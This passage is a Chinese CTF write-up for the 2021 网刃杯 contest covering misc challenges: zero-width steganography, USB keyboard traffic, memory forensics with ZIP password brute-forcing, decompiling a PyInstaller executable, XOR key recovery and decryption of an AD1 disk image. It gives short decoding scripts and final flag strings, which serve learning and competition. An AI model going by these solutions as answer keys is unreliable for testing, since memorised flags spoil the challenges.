<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2021网刃杯WP - n03tAck</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="n03tAck"><meta name="msapplication-TileImage" content="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="n03tAck"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="2021网刃杯WP"><meta property="og:type" content="blog"><meta property="og:title" content="n03tAck"><meta property="og:url" content="https://wp.n03tack.top/"><meta property="og:site_name" content="n03tAck"><meta property="og:description" content="2021网刃杯WP"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/clipboard_20210913_062529.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/clipboard_20210913_062623.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060849.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060902.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060923.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060933.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060945.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061021.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061041.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061103.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061124.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061138.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061214.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061235.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061249.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061305.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061320.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061334.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061348.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060517.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060715.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060807.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060824.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Rev/clipboard_20210913_061908.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Rev/clipboard_20210913_061944.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Rev/clipboard_20210913_062110.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Rev/clipboard_20210913_062224.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Web/image-20210912170208845.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Web/image-20210912170647316.png"><meta property="article:published_time" content="2021-09-14T09:10:14.000Z"><meta property="article:modified_time" content="2021-09-14T09:18:15.282Z"><meta property="article:author" content="n03tAck"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/clipboard_20210913_062529.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://wp.n03tack.top/posts/1010/"},"headline":"n03tAck","image":["https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/clipboard_20210913_062529.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/clipboard_20210913_062623.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060849.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060902.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060923.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060933.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060945.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061021.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061041.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061103.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061124.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061138.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061214.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061235.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061249.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061305.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061320.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061334.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061348.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060517.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060715.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060807.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060824.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Rev/clipboard_20210913_061908.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Rev/clipboard_20210913_061944.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Rev/clipboard_20210913_062110.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Rev/clipboard_20210913_062224.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Web/image-20210912170208845.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Web/image-20210912170647316.png"],"datePublished":"2021-09-14T09:10:14.000Z","dateModified":"2021-09-14T09:18:15.282Z","author":{"@type":"Person","name":"n03tAck"},"description":"2021网刃杯WP"}</script><link rel="canonical" href="https://wp.n03tack.top/posts/1010/"><link rel="icon" href="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/vs2015.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png" alt="n03tAck" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a><a class="navbar-item" href="/friend">战队成员</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://github.com/dota-st"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/dota-st"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-09-14  <a class="commentCountImg" href="/posts/1010/#comment-container"><span class="display-none-class">/posts/1010/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="c5e01860337e48724c6bf26ae94942d2">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>29 分钟  <i class="fas fa-pencil-alt"> </i>4.3 k</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">2021网刃杯WP</h1><div class="content"><blockquote>
<p>2021网刃杯WP</p>
<span id="more"></span>
</blockquote>
<h2 id="成绩"><a href="#成绩" class="headerlink" title="成绩"></a>成绩</h2><p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/clipboard_20210913_062529.png"></p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/clipboard_20210913_062623.png"></p>
<p>第二名</p>
<h2 id="MISC部分"><a href="#MISC部分" class="headerlink" title="MISC部分"></a>MISC部分</h2><p>气死我了气死我了气死我了<br>私钥头错了一直卡着，过了就好说多了。<br><strong>注：encrypted ad1是赛后出的</strong></p>
<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>解压得到flag.txt和一段密文<br>Flag.txt是0宽<br>勾选BCDE(vim查看就可以看到要勾选这几个)、得到hint<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060849.png" alt="在这里插入图片描述"><br>myself居然是flag.txt的md5，我麻了<br>得到key：f71b6b842d2f0760c3ef74911ffc7fdb<br>最后测试rabbit，得到flag<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060902.png" alt="在这里插入图片描述"></p>
<blockquote>
<p>flag{WelY0me_2_bOl3an}</p>
</blockquote>
<h3 id="baby-usb"><a href="#baby-usb" class="headerlink" title="baby-usb"></a>baby-usb</h3><p>键盘流量，完全按这篇即可<br><a target="_blank" rel="noopener" href="http://www.ga1axy.top/index.php/archives/22/">http://www.ga1axy.top/index.php/archives/22/</a><br><strong>脚本直接用，步骤直接仿</strong><br>得到</p>
<blockquote>
<p>output :<br>CT[DEL]ONH[DEL]GRATUE[DEL]LATIOKE[DEL][DEL]NSONFINY[DEL]DINGMEBUTIWII[DEL]LLNS[DEL]OTTELLYOUWHERETQA[DEL][DEL]HEPZ[DEL]ASSWORDWS[DEL][DEL]OX[DEL]FWE[DEL]OD[DEL]RDDOC[DEL]CUMENTISGOARFV[DEL][DEL][DEL]NDFINDITAGAIN</p>
</blockquote>
<p>发现删除的就是KEY，<br>The key is qazwsxedcrfv</p>
<p>即可打开word</p>
<blockquote>
<p>flag{685b42b0-da3d-47f4-a76c-0f3d07ea962a}</p>
</blockquote>
<h3 id="Mspaint"><a href="#Mspaint" class="headerlink" title="Mspaint"></a>Mspaint</h3><p>上vol，imageinfo显示Win7，pslist发现用了cmd、画图、ie，cmd说他喜欢把图片截图下来，因此filescan |grep ‘png’<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060923.png" alt="在这里插入图片描述"><br>导出，发现文件只有一个hack<br>然后iehistory发现他访问了一个百度云盘链接，尝试用hack，成功。密码即hack。下载下来附件，居然有密码。<br>因此查看内存图，方法如此链接最后一个<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42880719/article/details/117304586">https://blog.csdn.net/qq_42880719/article/details/117304586</a><br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060933.png" alt="在这里插入图片描述"><br>因为我怕看错（主要是我眼比较瞎），所以我用zip爆破软件，用户自定义爆<br>我选择了8%R~sSA52!iqp，长度8位<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060945.png" alt="在这里插入图片描述"></p>
<p>解压之后，发现是python写的<br>于是直接逆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参考：https://blog.csdn.net/weixin_44362969/article/details/105616531</span><br><span class="line">第一步：python pyinstxtravtor.py xxxxx.exe</span><br><span class="line"></span><br><span class="line">第二步：得到一个文件夹</span><br><span class="line">其中有一个struct 跟 xxxxx（都没有后缀名）</span><br><span class="line">十六进制查看struct，xxxxx。</span><br><span class="line">会发现xxxxx比struct少了一行</span><br><span class="line">这时将struct的那一行复制给xxxxx，然后xxxxx保存后添加后缀</span><br><span class="line">xxxxx.pyc</span><br><span class="line"></span><br><span class="line">第三步：使用uncompyle6（我是kali）</span><br><span class="line">uncompyle6 xxxxx.pyc &gt; xxxxx.py</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&#x27;xxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">    data += <span class="built_in">hex</span>(<span class="built_in">ord</span>(flag[i]) ^ <span class="built_in">ord</span>(key[(i % <span class="number">15</span>)]))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(data.upper())</span><br><span class="line">    data = <span class="string">&#x27;12045014240343684450506E5E1E1C165D045E6B52113C5951006F091E4F4C0C54426A52466A165B0122&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后现在需要找key，但是我们知道flag{开头，因此可以反推出key前5位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = [<span class="number">18</span>,<span class="number">4</span>,<span class="number">80</span>,<span class="number">20</span>,<span class="number">36</span>]</span><br><span class="line">keys = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(f[i]^<span class="built_in">ord</span>(keys[i])),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>得到th1s_，直接winhex搜key<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061021.png" alt="在这里插入图片描述"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">keys = <span class="string">&#x27;th1s_1s_th3_k3y&#x27;</span></span><br><span class="line">s = <span class="string">&#x27;12045014240343684450506E5E1E1C165D045E6B52113C5951006F091E4F4C0C54426A52466A165B0122&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(s[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>)^<span class="built_in">ord</span>(keys[(i % <span class="number">15</span>)])),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>其实这里预期搜key应该是内存取证用screenshot指令，可以看到key</p>
<blockquote>
<p>flag{20708c15-eb55-4cbc-930b-68de15c55b32}</p>
</blockquote>
<h3 id="encrypted-ad1"><a href="#encrypted-ad1" class="headerlink" title="encrypted ad1"></a>encrypted ad1</h3><p>积累了，学到了。是我傻了<br>下载下来文件名为ZW5jcnlwdA，解码之后得到encrypt<br>结合题目为ad1，所以应该是一个ad1的磁盘文件，并且加了密<br>查看文件尾，能够看到一串base<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061041.png" alt="在这里插入图片描述"></p>
<p>但很明显，这里转过来了，因此复制出来脚本转一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;&#x27;&#x27;==gqxEjgKtDzKI/D1ajBJIcxvLrijkUVc28YA3sTmY8Ac+r3fiDWl80a</span></span><br><span class="line"><span class="string">44vbCwhxf8xwibLU6V1Ek31d7Q8W78VcYS+8Za1+IhG3hQ3NiLkbmqXUzb2M3Ou7</span></span><br><span class="line"><span class="string">15G1xhX3lvi7Yj2CyTz68WQKzcoTvv4pZU+ISdQdNcoJEQSJhocwQAYgCUowrcMW</span></span><br><span class="line"><span class="string">AytwCo05H/yUQGTYA7acF8stHPUPScAoWdL/NW5FqASDAJRN7cM/3kR9GWzTw4WI</span></span><br><span class="line"><span class="string">mS36/C/94OBX1jJQVssAnd1NPD2F9EcX0GS2L9GIzdPyL5kZgZ8I2ShrzGo//HX5</span></span><br><span class="line"><span class="string">G+IqTcKRqsB5TAOddb4lTp/r6XowLqAY9IZJAGoAR9kcrKNzwsJXn6HZN29ilFTC</span></span><br><span class="line"><span class="string">VnwRqDpDulps/c2fyInUqsHzZxctm5iiCZRiy1XjcyLrJtRKbTvyfXY1K7D1Q+dg</span></span><br><span class="line"><span class="string">eKbzHMihscHQiBL+WMG/3Drwsz/vQiXdS7QCpNU230WH0HXZiqItJOfPLrpR5L7g</span></span><br><span class="line"><span class="string">VPjDC1WRlB2J169jNBIABGoAFCd8AqBrKhkTxfHOGZOugFK5RXT2+9S1rZEGMg5b</span></span><br><span class="line"><span class="string">xtBgNzeFo9pq2RtXAeWgXcJXSUC9MFnY5fbuToUSOlvsYr4CKk99EFiX7S1YU+Eo</span></span><br><span class="line"><span class="string">hUTs6hRIXbt6EdzkVQsZbDkgLIrjiOyRXO20Quq/a09PqC/ZqXz+mztjgRvlPYj4</span></span><br><span class="line"><span class="string">fgNABGoAxIhFqK1LV4121nsmnKfgPLUTEZk1bG05dULkA86/AdRgbJWJ+38/4Z+K</span></span><br><span class="line"><span class="string">GRT8Kqu2dQ4f47fSp+OQL76S4ur0Vmk2vXHOZqXuZIvBIV/5ZmO8uC5sdyT+Cb+3</span></span><br><span class="line"><span class="string">19ct8Twfc9lACABWXDG5kijTdzytbabEFmONqNHlOutjTFjGmWOABGoABFWJTb6I</span></span><br><span class="line"><span class="string">n8Or2leNITMvoTZeew52vTTGfAWmLeNfHh+qgRGt6QmpHt8+YqUyQr6HMFq5bNIH</span></span><br><span class="line"><span class="string">HeLDiPc6R6/eaiCZ2VYYf8G6G9vfzZLyb4JD8WHP3q4+gPlg+n1xQCsv+t5cGuhL</span></span><br><span class="line"><span class="string">JhPoD69aIgB0rxiEDzV6zG3SqziFZXjYtyXYpZ2oFEWTbXBMhnTucJXTRrxktXXx</span></span><br><span class="line"><span class="string">P3e1cRCbX0VZXxpZeLqd62O9s5QnfJJxSsHOaR8YZ2ONVLtotpFB6/WDX392066T</span></span><br><span class="line"><span class="string">jppXfKSRqD7QMDNO0Xd0nvRYfvAW2T9jsEPxPx2ZCV+JPYu2SKneIYz+QYYcaPA1</span></span><br><span class="line"><span class="string">zaE+aypIzG6SfCQABIoABAQADIQdDBG79zq8d0RhLOCxVaKSLcSQCTRtETiTLUYU</span></span><br><span class="line"><span class="string">yYk0WRs709wlDEsm0VsQI+X7HDSxaQJeIBWzZUaAs0ALuIqW4kw5Ny6ZSN1n52HJ</span></span><br><span class="line"><span class="string">QMEJV50RwrFxjgH5DfLGa7P2nQJWivL02fgBeaGtjkSi86zoPwOmmYnocbP3Ad0t</span></span><br><span class="line"><span class="string">bQtXECvOEUiz8TsbgalR5bkKpSTmR98NCO9SKAVUN5IM8uOnl2ct/37JLMYa+fGZ</span></span><br><span class="line"><span class="string">Q3I4ZHZmJN8vOANsnCNs68+QVWtRIo4fAp2QqHpmn/Is8OeOcwEJkwA3HJvJbHLI</span></span><br><span class="line"><span class="string">w0vleLaqwCP9UfXGHlBbknjJ4Deqb5RqnHQsN383ey+IADewAEQACKAABIApEIIM&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p>得到一个base串，看了之后应该类似于RSA之类的。<br>然后打开搞磁盘文件常用的FTK，发现FTK能解密，于是为了研究，主动去生成了一个ad1</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061103.png" alt="在这里插入图片描述"></p>
<p>然后反正就生成一个ad1，记得生成的文件给他加个密<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061124.png" alt="在这里插入图片描述"><br>注意到正确的文件头应该是41 44<br>于是将题目的文件尾base删掉、文件头00 00 改成 41 44<br>然后FTK里点击decrypt ad1选项<br>可以注意到<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061138.png" alt="在这里插入图片描述"><br>能使用证书来解密，于是尝试。<br>然鹅比赛期间我一直没添加—–BEGIN RSA PRIVATE KEY—–头和—–END RSA PRIVATE KEY—–尾，一直是加的—–BEGIN PRIVATE KEY—–，导致没解出来，我麻了<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061214.png" alt="在这里插入图片描述"><br>如图，然后保存为pfx文件。<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061235.png" alt="在这里插入图片描述"><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061249.png" alt="在这里插入图片描述"><br>解密之后，用FTK挂载此文件<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061305.png" alt="在这里插入图片描述"><br>这里我挂载到了H盘<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061320.png" alt="在这里插入图片描述"><br>直接想到时间来作为2进制，2进制转ascii<br>于是写个脚本转换</p>
